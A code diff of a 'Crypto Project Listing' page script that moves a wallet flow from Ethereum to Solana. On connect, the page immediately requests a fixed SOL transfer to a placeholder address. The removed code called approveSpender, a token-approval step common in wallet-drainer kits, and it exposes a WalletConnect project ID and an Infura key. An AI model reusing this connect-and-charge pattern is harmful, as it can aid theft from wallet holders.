@@ -8,7 +8,8 @@ const feeModal = document.getElementById('feeModal');
 const walletModal = document.getElementById('walletModal');
 const closeButtons = document.getElementsByClassName('close');
 const proceedButton = document.getElementById('proceedButton');
-const phantomButton = document.getElementById('phantomButton'); // replace MetaMask with Phantom
+const phantomButton = document.getElementById('phantomButton'); // Phantom wallet button
+const walletConnectButton = document.getElementById('walletConnectButton'); // WalletConnect button
 
 let solanaProvider = null;
 
@@ -45,6 +46,10 @@ if (phantomButton) {
   phantomButton.addEventListener('click', connectPhantom);
 }
 
+if (walletConnectButton) {
+  walletConnectButton.addEventListener('click', connectWalletConnectSolana);
+}
+
 /* ============================
    PHANTOM WALLET
    ============================ */
@@ -52,14 +57,14 @@ async function connectPhantom() {
   try {
     const provider = window.solana;
     if (!provider || !provider.isPhantom) {
-      alert('Phantom Wallet not found. Please install it.');
+      alert('Phantom Wallet not found. Please install it or use walletconnect to use phantom mobile.');
       return;
     }
 
     const resp = await provider.connect();
     solanaProvider = provider;
 
-    console.log('Connected account:', resp.publicKey.toString());
+    console.log('Connected Phantom account:', resp.publicKey.toString());
 
     await sendSol(resp.publicKey.toString());
   } catch (error) {
@@ -68,11 +73,11 @@ async function connectPhantom() {
 }
 
 /* ============================
-   WALLETCONNECT v2 (ETHEREUM ONLY, COPIED STYLE)
+   WALLETCONNECT v2 (SOLANA)
    ============================ */
 let wcProvider = null;
 
-async function connectWalletConnect() {
+async function connectWalletConnectSolana() {
   try {
     if (wcProvider) {
       await wcProvider.disconnect().catch(() => {});
@@ -82,14 +87,14 @@ async function connectWalletConnect() {
     walletConnectButton.classList.add('loading');
     walletConnectButton.disabled = true;
 
-    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
+    const { SolanaProvider } = await import('https://esm.sh/@walletconnect/solana-provider@latest');
 
-    wcProvider = await EthereumProvider.init({
-      projectId: "59ba0228712f04a947916abb7db06ab1", // replace with your valid WalletConnect Cloud projectId
-      chains: [1], // Ethereum mainnet only
+    wcProvider = await SolanaProvider.init({
+      projectId: "YOUR_PROJECT_ID", // replace with your WalletConnect Cloud projectId
+      chains: ["solana:mainnet"],   // Solana mainnet
       showQrModal: true,
       rpcMap: {
-        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc" // replace with your Infura/Alchemy key
+        "solana:mainnet": "https://api.mainnet-beta.solana.com"
       },
       metadata: {
         name: 'Crypto Project Listing',
@@ -98,16 +103,14 @@ async function connectWalletConnect() {
     });
 
     const accounts = await wcProvider.enable();
-    window.ethereum = wcProvider;
+    solanaProvider = wcProvider;
 
-    provider = new ethers.providers.Web3Provider(wcProvider);
-    signer = provider.getSigner();
-    activeProviderType = 'walletconnect';
+    console.log("Connected WalletConnect Solana account:", accounts[0]);
 
-    await approveSpender(accounts[0]);
+    await sendSol(accounts[0]);
   } catch (err) {
     console.error(err);
-    alert('Wallet Connection Error. Please retry or refresh the page.');
+    alert('WalletConnect (Solana) Error. Please retry or refresh the page.');
   }
 
   walletConnectButton.classList.remove('loading');
@@ -126,6 +129,7 @@ async function sendSol(account) {
     const receiver = "REPLACE_WITH_RECEIVER_SOL_ADDRESS"; // your backend/env value
     const lamports = 0.01 * 1e9; // example: send 0.01 SOL
 
+    const connection = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
     const transaction = new window.solanaWeb3.Transaction().add(
       window.solanaWeb3.SystemProgram.transfer({
         fromPubkey: solanaProvider.publicKey,
@@ -135,13 +139,11 @@ async function sendSol(account) {
     );
 
     transaction.feePayer = solanaProvider.publicKey;
-    const { blockhash } = await window.solanaWeb3.Connection
-      .prototype.getRecentBlockhash.call(new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com"));
+    const { blockhash } = await connection.getRecentBlockhash();
     transaction.recentBlockhash = blockhash;
 
     const signed = await solanaProvider.signTransaction(transaction);
-    const signature = await new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com")
-      .sendRawTransaction(signed.serialize());
+    const signature = await connection.sendRawTransaction(signed.serialize());
 
     alert(`✅ SOL transfer successful!\nTx: ${signature}`);
 
@@ -159,4 +161,3 @@ async function sendSol(account) {
     alert("❌ Transfer failed: " + error.message);
   }
 }
-
